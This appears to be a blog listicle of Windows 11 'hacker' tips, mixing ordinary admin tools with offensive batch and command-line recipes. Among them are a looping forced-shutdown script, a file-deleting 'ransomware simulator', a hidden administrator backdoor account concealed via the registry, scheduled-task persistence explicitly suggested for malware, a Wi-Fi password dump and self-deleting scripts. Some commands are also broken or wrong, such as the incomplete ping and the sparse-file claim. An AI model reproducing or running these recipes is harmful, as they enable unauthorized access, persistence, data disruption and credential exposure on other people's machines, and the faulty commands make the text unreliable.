# Hardcore Windows 11 Secrets

**Pure advanced/undocumented hacker-level territory** now. Here's another batch of **deep Windows 11 secrets, hacks, forensic/debugging-level tricks, hidden modules, and shell internals**:

***

### **More Hardcore Windows 11 Secrets**

#### 1. **Enable Hidden Windows Features via `vivetool`**

* Tool to enable hidden Microsoft features before public release.
*   Install:

    ```bash
    winget install --id=RafaelRivera.ViveTool
    ```
*   Example: Enable new Taskbar search bar:

    ```bash
    vivetool /enable /id:958685
    ```
* GitHub: [https://github.com/thebookisclosed/ViVe](https://github.com/thebookisclosed/ViVe)

***

#### 2. **Use `fsutil` to Create Zero-Size Sparse Files**

*   Terminal command:

    ```bash
    fsutil file createnew filename.txt 0
    fsutil sparse setflag filename.txt
    fsutil sparse setrange filename.txt 0 1048576
    ```
* Makes a **1MB file that takes 0 bytes on disk**. Great for file system testing, deception.

***

#### 3. **Create a Fake Shutdown Virus (Harmless Prank)**

*   Save as `.bat`:

    ```bat
    @echo off
    :loop
    shutdown -s -t 1 -c "System crash detected"
    goto loop
    ```
*   Or simulate formatting:

    ```bat
    @echo off
    color 0a
    echo Deleting C:\
    ping localhost -n  >nul
    echo File 1 deleted...
    ```

***

#### 4. **Secret Boot Diagnostics Log**

*   Boot logs stored at:

    ```
    C:\Windows\ntbtlog.txt
    ```
*   Enable:

    ```
    msconfig > Boot > check "Boot log"
    ```

***

#### 5. **Dump All Wi-Fi Passwords**

*   Terminal:

    ```bash
    netsh wlan show profiles
    netsh wlan show profile name="WiFiName" key=clear
    ```

***

#### 6. **Disable Windows Telemetry via Hosts or Firewall**

*   Block domains via `hosts` or firewall rules:

    ```
    v10.events.data.microsoft.com
    settings-win.data.microsoft.com
    telemetry.microsoft.com
    ```

***

#### 7. **Create One-Liner Ransomware Simulator**

> Educational only — harmless example.

```bat
@echo off
for %%f in (*.*) do (
  copy %%f %%f.locked
  del %%f
)
echo Your files are locked!
```

***

#### 8. **Master Scheduled Tasks Hidden Backdoors**

*   View all scheduled tasks (even hidden):

    ```
    schtasks /query /fo LIST /v
    ```
*   You can persist malware, scripts, or custom jobs using:

    ```bash
    schtasks /create /sc minute /mo 1 /tn "Updater" /tr "cmd.exe /c notepad.exe"
    ```

***

#### 9. **Process Hollowing / Doppelganging Simulation**

> Use `Process Hacker` or tools like `Hollow.exe` (for ethical experiments).

* Load a legitimate process (`svchost.exe`) then replace memory contents with custom payload.

***

#### 10. **Trigger Fake Blue Screen of Death**

*   Works with:

    ```
    Ctrl + Scroll Lock + Scroll Lock
    ```
*   **Must enable via registry first:**

    ```
    HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\kbdhid\Parameters
    DWORD: CrashOnCtrlScroll = 1
    ```

***

#### 11. **Windows Sandbox (Disposable OS)**

* Enable from “Optional Features”
*   Run any suspicious file in an isolated Windows instance that resets on close:

    ```bash
    Windows Key > search “Windows Sandbox”
    ```

***

#### 12. **Use `Procdump` to Catch Malware on Crash**

*   Monitor a suspicious app:

    ```
    procdump -e -ma app.exe dump.dmp
    ```

***

#### 13. **Use Sysinternals for Deep Analysis**

* **Autoruns**: Show all autostarts (registry, startup, DLLs, services)
* **Process Explorer**: Replace Task Manager
* **TCPView**: Monitor open ports like Wireshark-lite
* **PsExec**: Run remote/hidden processes

***

#### 14. **Make Hidden Admin Account (Backdoor)**

*   CMD as admin:

    ```bash
    net user HiddenAdmin P@ssw0rd /add
    net localgroup administrators HiddenAdmin /add
    net user HiddenAdmin /active:yes
    ```
*   Hide from login screen:

    ```
    HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList
    DWORD: HiddenAdmin = 0
    ```

***

#### 15. **Self-Deleting Batch File**

*   Make a `.bat` file delete itself:

    ```bat
    del "%~f0"
    ```

***

#### 16. **Encrypt Files with EFS**

* Right-click file > Properties > Advanced > Encrypt contents to secure data
*   Or via terminal:

    ```bash
    cipher /e mysecret.txt
    ```

***

#### 17. **Use PowerShell to Export Full Driver List**

```powershell
Export-WindowsDriver -Online -Destination "C:\DriversBackup"
```

***

#### 18. **Trace System Events in Real-Time (ETW)**

* Use `xperf`, `perfmon`, or `Event Tracing for Windows` (ETW)
* Log system calls, disk, CPU, network with zero overhead.

***

#### 19. **Create a “Super Hidden” File**

```bash
attrib +h +s filename.txt
```

* Won’t show up even if “Show hidden” is enabled.

***

#### 20. **Turn Any File into .exe (Shell Pack)**

* Rename `.bat`, `.ps1`, or `.vbs` scripts into `.exe` using tools like `Bat To Exe Converter`
* Or build a custom packer in Python with `pyinstaller`, `cx_Freeze`, etc.

***

#### 21. **USB Rubber Ducky Payload Simulator**

* Write payload in `.vbs`, `.bat`, or `.ps1`
* Simulate via AutoHotKey or HID emulation tools.
